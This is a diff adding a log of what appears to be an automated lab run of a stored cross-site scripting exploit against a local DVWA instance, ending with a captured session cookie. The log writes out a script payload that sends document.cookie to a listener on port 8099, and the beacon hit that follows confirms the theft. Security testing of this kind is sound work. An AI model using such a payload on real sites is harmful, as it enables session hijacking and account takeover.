@@ -1,0 +1,18 @@
+﻿SINK_HIT {"at": "2026-10-12T10:02:34.536458", "method": "GET", "path": "/selftest", "client": "127.0.0.1", "headers": {"Host": "127.0.0.1:8099", "User-Agent": "python-requests/2.32.5", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept": "*/*", "Connection": "keep-alive"}, "body": ""}
+--- sink_started: {"port": 8099, "self_test_status": 200, "listen": "127.0.0.1 only", "logfile": "/tmp/loop3-t4-b5-sink.jsonl"}
+--- dvwa_login: {"phpsessid": "0094cfac7d43ef2253f84d7d317dc5c5", "security": "low"}
+--- guestbook_rows_before: {"count": "4"}
+--- stored_xss_post: {"status": 200, "payload": "<script>new Image().src=\"http://127.0.0.1:8099/beacon?t=loop3t4canary778899&c=\"+encodeURIComponent(document.cookie)</script>", "reflected_unescaped": true}
+--- guestbook_row_after: {"count": "5", "last_row": "", "row_id": ""}
+--- stored_unescaped_in_page: {"payload_in_page": true}
+--- db_stored_plaintext: {"note": "comparing stored value with payload", "identical": false}
+--- browser_login: {"url": "http://127.0.0.1/dvwa/index.php", "title": "Welcome :: Damn Vulnerable Web Application (DVWA)", "document_cookie": "PHPSESSID=036dd2f56fcc1ec3e5538e1643d3f51e; security=low"}
+SINK_HIT {"at": "2026-10-12T10:02:41.329402", "method": "GET", "path": "/beacon?t=loop3t4canary778899&c=PHPSESSID%3D036dd2f56fcc1ec3e5538e1643d3f51e%3B%20security%3Dlow", "client": "127.0.0.1", "headers": {"Host": "127.0.0.1:8099", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Linux\"", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/148.0.0.0 Safari/537.36", "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Chromium\";v=\"148\"", "sec-ch-ua-mobile": "?0", "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8", "Sec-Fetch-Site": 
+--- browser_rendered_xss_s: {"url": "http://127.0.0.1/dvwa/vulnerabilities/xss_s/", "title": "Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA)", "raw_script_tag_in_dom": true, "escape_check": false, "sink_hits_added": 1}
+--- browser_screenshot: {"path": "/tmp/loop3-t4-b5-xss.png", "bytes": 95256}
+--- driver_info: {"ok": true, "version": "148.0.7778.178"}
+--- sink_hits: {"count": 3, "hits": [{"method": "GET", "path": "/selftest", "client": "127.0.0.1", "Cookie": null, "User-Agent": "python-requests/2.32.5", "Referer": null}, {"method": "GET", "path": "/selftest", "client": "127.0.0.1", "Cookie": null, "User-Agent": "python-requests/2.32.5", "Referer": null}, {"method": "GET", "path": "/beacon?t=loop3t4canary778899&c=PHPSESSID%3D036dd2f56fcc1ec3e5538e1643d3f51e%3B%20security%3Dlow", "client": "127.0.0.1", "Cookie": "PHPSESSID=036dd2f56fcc1ec3e5538e1643d3f51e; security=low", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/148.0.0.0 Safari/537.36", "Referer": "http://127.0.0.1/"}]}
+--- beacon_received: {"count": 1, "cookie_leaked": "PHPSESSID=036dd2f56fcc1ec3e5538e1643d3f51e; security=low", "path": "/beacon?t=loop3t4canary778899&c=PHPSESSID%3D036dd2f56fcc1ec3e5538e1643d3f51e%3B%20security%3Dlow"}
+{"rc": "ok", "steps": 13, "row_id": "", "beacon": 1}
+{"rc": 0, "stdout_len": 3143, "stderr_len": 0}
+
